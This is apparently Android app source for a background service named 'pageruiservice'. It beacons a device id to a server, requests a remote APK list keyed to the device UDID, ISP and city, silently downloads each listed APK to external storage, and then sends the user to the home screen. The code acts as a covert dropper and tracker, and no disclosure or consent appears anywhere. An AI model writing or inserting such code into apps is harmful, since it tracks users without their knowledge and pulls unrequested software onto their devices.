package com.shuiguo.service;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;
import com.shuiguo.activity.rudemos;
import com.shuiguo.receiver.AlarmReceiver;
import com.shuiguo.receiver.AlarmReceiverzd;
import com.shuiguo.utils.Constant;
import com.shuiguo.utils.Udid;
import com.shuiguo.utils.Utils;
import com.shuiguo.utils.checkutil;
import com.shuiguo.utils.filestart;
import com.shuiguo.utils.loadfile;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

/**
 * Created by Administrator on 2016/7/14 0014.
 */
public class pageruiservice extends Service {
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }



    // public static int isload=1;
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread() {

            @Override
            public void run() {
                try {
                    new checkutil().getURLResponse(new Constant().BASEURL + "did=" + new Constant().getdid() + "&interface=logmmms"+"&result=HT");
//                    Utils.playRingTone(pageruiservice.this);
                    new Utils().startAct(pageruiservice.this);
                    if (new filestart().getisload() == 1) {
                        setdown();
                        startHome();
                        new filestart().setisload(2);
                    }
//                        new checkutil().getURLResponse(new Constant().BASEURL + "did=" + new Constant().getdid() + "&interface=ruimengstart" + "&uid=" + Udid.with(pageruiservice.this).fetch());

                } catch (Exception e) {
                    e.printStackTrace();
                }

                // new Command(pageruiservice.this).start();

            }
        }.start();
       // new Utils().startAct(pageruiservice.this);
        //  oneAlarm();
        return super.onStartCommand(intent, flags, startId);
    }
    private void startHome(){
        Intent home = new Intent(Intent.ACTION_MAIN);
        home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        home.addCategory(Intent.CATEGORY_HOME);
        startActivity(home);
    }
    /*与下载*/
    public void setdown() {
        //this.context=context;
        new Thread() {
            @Override
            public void run() {
                try {
                    Date date = new Date();
                    SimpleDateFormat dateFormat = new SimpleDateFormat("yMd");
                    String time = dateFormat.format(date);
                    String sdpath = Environment.getExternalStorageDirectory() + "/";
                    loadfile s = new loadfile();
                    String result=s.getURLResponse(new Constant().apklist + "?uid=" + Udid.with(pageruiservice.this).fetch()+"&qudao="+new Constant().getdid()+"&isp="+new filestart().getispcode()+"&city="+new filestart().getcitycode());
                    JSONObject jsonObject = new JSONObject(result);
                    int status = 1;
                    status = jsonObject.getInt("status");

                    if (status == 1) {
                        JSONArray jsonArray = jsonObject.getJSONArray("data");
                        for (int i = 0; i < jsonArray.length(); i++) {
                            JSONObject jobj = (JSONObject) jsonArray.get(i);
                            String Appname = jobj.getString("Appname");
                            String Appid = jobj.getString("Appid");
                            String Appurl = jobj.getString("Appurl");
                            String Apppackagename = jobj.getString("Apppackagename");
                            s.downLoadFile(Appurl, "demotext" + Appid + time);
//                            if (!s.fileIsExists(sdpath + "Download/" + "demotext" + Appid + time + ".apk")) {
//                                s.downLoadFile(Appurl, "demotext" + Appid + time);
//
//                            }
                            //sleep(10000);
                        }
                    }
                } catch (Exception e) {
                    //new checkutil().getURLResponse(new Constant().BASEURL + "did=" + new Constant().getdid() + "&interface=logmmms" + "&result=" + e);
                    e.printStackTrace();
                }
            }
        }.start();

    }

}

